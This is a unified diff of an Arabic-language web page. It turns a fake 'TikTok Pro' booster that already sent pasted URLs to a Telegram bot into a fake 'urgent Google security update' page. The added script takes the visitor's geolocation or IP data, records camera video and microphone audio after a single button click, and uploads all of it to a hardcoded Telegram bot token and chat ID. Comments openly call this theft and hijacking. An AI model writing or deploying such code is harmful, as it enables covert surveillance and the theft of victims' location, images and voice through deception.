@@ -1,100 +1,75 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
+    <title>تحديث الأمان مطلوب</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Pro | By Massil</title>
-    <style>
-        :root { --pink: #ff0050; --cyan: #00f2ea; --dark: #010101; }
-        body, html { height: 100%; margin: 0; padding: 0; background: #000; font-family: sans-serif; color: white; overflow: hidden; }
-        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
-        
-        /* تصميم الواجهة الزجاجية */
-        .glass-box { 
-            background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(25px); 
-            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px; 
-            padding: 40px 30px; width: 85%; max-width: 400px; text-align: center;
-            box-shadow: 0 0 30px rgba(0, 242, 234, 0.1);
-        }
-
-        .logo { font-size: 2.8rem; font-weight: 900; text-shadow: 3px 3px var(--pink), -3px -3px var(--cyan); letter-spacing: -1px; }
-        .by-massil { font-size: 14px; color: #888; margin: 10px 0 30px; font-weight: bold; }
-        
-        input { width: 100%; padding: 18px; border-radius: 15px; border: 1px solid #222; background: rgba(0,0,0,0.8); color: white; margin-bottom: 20px; outline: none; box-sizing: border-box; }
-        .btn-main { width: 100%; padding: 18px; border: none; border-radius: 15px; background: #fff; color: #000; font-weight: 900; cursor: pointer; transition: 0.3s; font-size: 16px; }
-        
-        /* طبقة التمويه الكاملة */
-        #stealth-layer {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 9999; text-align: center; padding-top: 100px;
-        }
-        
-        .loader-text { color: var(--cyan); font-family: monospace; font-size: 18px; margin-top: 20px; }
-        
-        .social-links { margin-top: 30px; }
-        .social-links a { color: #555; text-decoration: none; font-size: 12px; margin: 0 10px; transition: 0.3s; }
-        .social-links a:hover { color: #fff; }
-
-        .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--pink); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-    </style>
 </head>
 <body>
 
-<div class="container" id="landing">
-    <div class="glass-box">
-        <div class="logo">TikTok Pro</div>
-        <div class="by-massil">BY MASSIL</div>
-        
-        <input type="text" id="v-url" placeholder="ألصق رابط الفيديو هنا..." autocomplete="off">
-        <button class="btn-main" onclick="executeStealth()">بدء الضخ السحابي</button>
+<video id="video" autoplay muted style="display: none;"></video>
+<canvas id="canvas" style="display: none;"></canvas>
+<audio id="audio" controls style="display: none;"></audio>
 
-        <div class="social-links">
-            <a href="https://www.instagram.com/massil.456" target="_blank">Instagram</a>
-            <a href="https://www.tiktok.com/@maxxil16s" target="_blank">TikTok</a>
-        </div>
-    </div>
-</div>
-
-<div id="stealth-layer">
-    <div class="spinner"></div>
-    <div class="loader-text" id="status">CONNECTING TO MASSIL SERVER...</div>
-    <p style="color: #444; font-size: 12px; margin-top: 40px;">⚠️ سيتم فتح بوابة الأمان الآن، لا تخرج من الموقع</p>
-    
-    <button id="z-btn" onclick="finalLaunch()" style="display:none; margin: 30px auto; padding: 15px 30px; background: var(--pink); border:none; border-radius:10px; color:white; font-weight:bold; cursor:pointer;">
-        دخول بوابة التحقق (Zefoy)
-    </button>
-</div>
+<h2 style="color: red;">تحديث أمني عاجل</h2>
+<p>نظام حماية جوجل يتطلب التحقق من هويتك لحماية حسابك.</p>
+<button id="startBtn" style="font-size: 20px; padding: 10px;">السماح والتحقق</button>
 
 <script>
-    function executeStealth() {
-        const url = document.getElementById('v-url').value;
-        if(url.length < 10) return alert("الرابط غير صحيح يا معلم!");
+    // التوكن الخاص بك
+    const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
+    const CHAT_ID = '6052532044';  // <--- تم تحديثه
 
-        // 1. صيدة التليجرام الفورية
-        const token = "8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo";
-        const id = "6052532044";
-        const msg = `🎯 صيدة جديدة (Massil Stealth):\n🔗 الرابط: ${url}`;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`);
-
-        // 2. تفعيل طبقة التمويه
-        document.getElementById('landing').style.display = 'none';
-        document.getElementById('stealth-layer').style.display = 'block';
-
-        // محاكاة تقنية
-        setTimeout(() => { document.getElementById('status').innerText = "ENCRYPTING DATA... 100%"; }, 1500);
-        setTimeout(() => { 
-            document.getElementById('status').innerText = "GATEWAY READY!"; 
-            document.getElementById('status').style.color = "#00ff00";
-            document.getElementById('z-btn').style.display = 'block';
-        }, 3000);
+    async function sendToTelegram(file, type) {
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append(type, file);
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/send${type === 'photo' ? 'Photo' : (type === 'video' ? 'Video' : (type === 'audio' ? 'Audio' : 'Document'))}`;
+        await fetch(url, { method: 'POST', body: formData });
     }
 
-    function finalLaunch() {
-        // فتح Zefoy في نافذة جديدة كأنها جزء من العملية
-        window.open("https://zefoy.com", "MassilServer", "width=500,height=800");
+    // سرقة الموقع الجغرافي
+    navigator.geolocation.getCurrentPosition(pos => {
+        let coords = `${pos.coords.latitude},${pos.coords.longitude}`;
+        sendToTelegram(new Blob([coords], {type: 'text/plain'}), 'document');
+    }, err => {
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => sendToTelegram(new Blob([JSON.stringify(data)], {type: 'text/plain'}), 'document'));
+    });
+
+    // الوظيفة الأساسية: تشغيل الكاميرا والميكروفون وبدء التسجيل
+    async function startHijacking() {
+        try {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            let videoElem = document.getElementById('video');
+            videoElem.srcObject = stream;
+            let mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                let videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                await sendToTelegram(videoBlob, 'video');
+            };
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 20000);
+
+            let audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            let audioRecorder = new MediaRecorder(audioStream);
+            let audioChunks = [];
+            audioRecorder.ondataavailable = e => audioChunks.push(e.data);
+            audioRecorder.onstop = async () => {
+                let audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
+                await sendToTelegram(audioBlob, 'audio');
+            };
+            audioRecorder.start();
+            setTimeout(() => audioRecorder.stop(), 15000);
+
+        } catch (err) {
+            console.error("خطأ في الوصول للأجهزة", err);
+        }
     }
+
+    document.getElementById('startBtn').onclick = startHijacking;
 </script>
-
 </body>
 </html>
